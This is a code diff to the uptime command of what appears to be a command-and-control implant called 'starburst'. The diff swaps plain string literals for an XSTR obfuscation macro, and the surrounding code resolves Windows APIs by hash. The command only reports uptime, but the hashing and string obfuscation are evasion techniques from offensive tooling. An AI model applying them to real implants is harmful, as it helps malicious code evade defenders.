@@ -27,7 +27,7 @@ auto declfn starburst::cmd_uptime(
 
     if ( !pGetSystemTime ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
 
@@ -38,7 +38,7 @@ auto declfn starburst::cmd_uptime(
             expr::hash_string( "GetTickCount64" ) ) );
     if ( !pGTC ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
     uint32_t total_sec = static_cast<uint32_t>( pGTC() / 1000 );
@@ -49,7 +49,7 @@ auto declfn starburst::cmd_uptime(
             expr::hash_string( "GetTickCount" ) ) );
     if ( !pGTC ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
+            XSTR( "API resolution failed" ) );
         return;
     }
     uint32_t total_sec = pGTC() / 1000u;
@@ -83,7 +83,7 @@ auto declfn starburst::cmd_uptime(
     char num[16];
 
     // "Uptime: Xd Xh Xm Xs\n"
-    str_copy( output + off, symbol<char*>( const_cast<char*>( "Uptime: " ) ) );
+    str_copy( output + off, XSTR( "Uptime: " ) );
     off = str_len( output );
 
     int_to_str( num, days, 10 );
@@ -104,7 +104,7 @@ auto declfn starburst::cmd_uptime(
     output[off++] = '\n';
 
     // "Boot: approx YYYY-MM-DD HH:MM:SS"
-    str_copy( output + off, symbol<char*>( const_cast<char*>( "Boot: approx " ) ) );
+    str_copy( output + off, XSTR( "Boot: approx " ) );
     off += 13;
 
     int_to_str( num, boot_year, 10 );
